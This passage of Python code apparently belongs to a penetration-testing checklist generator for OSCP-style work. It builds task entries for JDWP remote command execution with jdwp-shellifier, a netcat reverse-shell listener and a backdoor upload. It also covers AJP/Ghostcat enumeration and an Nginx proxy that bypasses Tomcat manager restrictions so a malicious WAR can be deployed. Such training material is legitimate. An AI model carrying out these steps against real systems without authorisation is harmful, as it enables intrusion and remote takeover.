                            'tags': ['OSCP:HIGH', 'EXPLOIT'],
                            'flag_explanations': {
                                '-t': 'Target IP',
                                '-p': 'JDWP port',
                                '--break-on': 'Breakpoint method (use String.indexOf for stability)',
                                '--cmd': 'Command to execute on target'
                            },
                            'success_indicators': [
                                'Breakpoint hit',
                                'Command executed',
                                'Reverse shell received'
                            ],
                            'failure_indicators': [
                                'Connection refused',
                                'Breakpoint never triggered',
                                'No shell received'
                            ],
                            'next_steps': [
                                'Set up listener FIRST: nc -lvnp <LPORT>',
                                'Execute jdwp-shellifier',
                                'Wait for breakpoint trigger (may take time)',
                                'Consider uploading backdoor for stability'
                            ],
                            'alternatives': [
                                'Without --break-on (less stable)',
                                'nmap NSE script: jdwp-exec'
                            ],
                            'notes': 'Tool: https://github.com/IOActive/jdwp-shellifier. More stable with --break-on flag. Breakpoint requires application activity.'
                        }
                    }
                ]
            })

        # === AJP (Apache JServ Protocol, port 8009) ===
        if port == 8009 or 'ajp' in service:
            tasks['children'].append({
                'id': f'ajp-enum-{port}',
                'name': 'AJP Protocol Enumeration',
                'type': 'parent',
                'children': [
                    {
                        'id': f'nmap-ajp-{port}',
                        'name': 'AJP NSE Scripts',
                        'type': 'command',
                        'metadata': {
                            'command': f'nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -p {port} {target}',
                            'description': 'Enumerate AJP service with Nmap NSE scripts',
                            'tags': ['OSCP:HIGH', 'AUTOMATED'],
                            'flag_explanations': {
                                '-sV': 'Service version detection',
                                '--script': 'Run NSE scripts for AJP enumeration',
                                'ajp-auth': 'Check authentication requirements',
                                'ajp-headers': 'Enumerate HTTP headers via AJP',
                                'ajp-methods': 'Enumerate allowed HTTP methods',
                                'ajp-request': 'Test arbitrary AJP requests'
                            },
                            'success_indicators': [
                                'AJP service confirmed',
                                'HTTP methods enumerated',
                                'Headers revealed'
                            ],
                            'next_steps': [
                                'Test Ghostcat vulnerability (CVE-2020-1938)',
                                'Set up Nginx AJP proxy to access Tomcat',
                                'Test for exposed manager via AJP'
                            ],
                            'notes': 'AJP allows proxying to Tomcat - can access protected resources'
                        }
                    },
                    {
                        'id': f'nginx-ajp-proxy-{port}',
                        'name': 'Nginx AJP Reverse Proxy',
                        'type': 'manual',
                        'metadata': {
                            'description': 'Access Tomcat manager via AJP proxy (bypass restrictions)',
                            'tags': ['OSCP:HIGH', 'ADVANCED'],
                            'alternatives': [
                                '1. Clone: git clone https://github.com/ScribblerCoder/nginx-ajp-docker',
                                '2. Edit nginx.conf: Replace TARGET-IP with target',
                                '3. Build: docker build . -t nginx-ajp-proxy',
                                '4. Run: docker run -it --rm -p 80:80 nginx-ajp-proxy',
                                '5. Access: http://127.0.0.1/manager/html'
                            ],
                            'success_indicators': [
                                'Tomcat manager accessible via localhost:80',
                                'AJP proxy functional',
                                'Authentication prompt appears'
                            ],
                            'next_steps': [
                                'Test default credentials',
                                'Deploy malicious WAR',
                                'Exploit manager as normal'
                            ],
                            'notes': 'AJP proxy bypasses IP restrictions. Dockerized version simplest. Manual: compile Nginx with ajp_module.',
                            'estimated_time': '10-15 minutes setup'
                        }
                    }
                ]
            })

        return tasks if tasks['children'] else None
